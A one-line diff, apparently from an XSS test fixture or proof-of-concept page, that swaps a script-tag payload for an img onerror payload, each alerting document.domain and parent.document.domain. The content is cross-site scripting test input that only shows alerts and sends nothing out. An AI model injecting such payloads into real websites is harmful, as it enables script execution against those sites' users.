@@ -1,1 +1,1 @@
-<script>var secret='if3 secret!';alert(document.domain);alert(parent.document.domain)</script>
+<img src=x onerror=alert(document.domain);alert(parent.document.domain)>
